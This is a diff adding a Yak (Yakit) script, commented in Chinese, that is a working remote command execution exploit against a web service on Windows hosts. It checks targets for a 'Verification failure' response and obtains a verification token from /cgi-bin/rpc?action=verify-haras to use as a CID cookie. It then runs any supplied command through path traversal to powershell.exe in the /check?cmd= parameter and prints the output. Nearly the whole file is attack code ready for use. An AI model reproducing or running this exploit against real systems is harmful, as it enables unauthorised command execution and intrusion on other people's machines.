@@ -1,0 +1,99 @@
+yakit.AutoInitYakit()
+log.setLevel("info")
+// 参数获取
+host = cli.String("host", cli.setRequired(true), cli.setHelp("攻击目标IP+端口"))
+cmd = cli.String("commend", cli.setHelp("需要执行的命令"), cli.setRequired(false))
+yakit.Info("测试目标: %v", host)
+// 指纹识别
+getHttp = func (host) {
+    return poc.HTTP(`GET / HTTP/1.1
+    Host: {{params(target)}}
+    Connection: close
+    Content-Length: 0
+    Pragma: no-cache
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36`,
+        poc.params({
+            "target": host,
+        }),
+    )
+}
+// 漏洞利用
+verHttp = func (host) {
+    return poc.HTTP(`GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
+    Host: {{params(target)}}
+    Connection: close
+    Content-Length: 0
+    Pragma: no-cache
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36`,
+        poc.params({
+            "target": host,
+        }),
+    )
+}
+expHttp = func (host, cmd, Cookie) {
+    return poc.HTTP(`GET /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+{{params(cmd)}} HTTP/1.1
+    Host: {{params(target)}}
+    Connection: close
+    Content-Length: 0
+    Pragma: no-cache
+    Cookie: {{params(Cookie)}}
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36`,
+        poc.params({
+            "target": host,
+            "cmd": cmd,
+            "Cookie" : Cookie,
+        }),
+    )
+}
+getver = func (host) {
+    rep, _, err = verHttp(host)
+    die(err)
+    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rep)
+    res = ""
+    for key, value = range body {
+        res = res + string(value)
+    }
+    map_ver = json.loads(res)
+    ver = map_ver["verify_string"]
+    return ver
+}
+exp = func (host, cmd, Cookie) {
+    req, _, err = expHttp(host, cmd, Cookie)
+    die(err)
+    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(req)
+    res = ""
+    for key, value = range body {
+        res = res + string(value)
+    }
+    return res
+}
+if cmd != "" {
+    yakit.Info("命令: %v", cmd)
+    cmd = codec.EncodeUrl(cmd)
+    yakit.Info("即将进行漏洞利用")
+    ver = getver(host)
+    Cookie = "CID=" + ver
+    res_exp = exp(host, cmd, Cookie)
+    if res_exp != nil {
+        yakit.Info("命令执行成功: %v", res_exp)
+    }else{
+        yakit.Info("命令执行成功但无回显")
+    }
+}else{
+    rsp, _, err = getHttp(host)
+    die(err)
+    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+    res = ""
+    for key, value = range body {
+        res = res + string(value)
+    }
+    if str.MatchAnyOfSubString(res, "Verification failure") {
+        yakit.Info("可能存在rce漏洞 %v", host)
+    }else{
+        yakit.Info("未发现漏洞")
+    }
+}
+// 结果返回
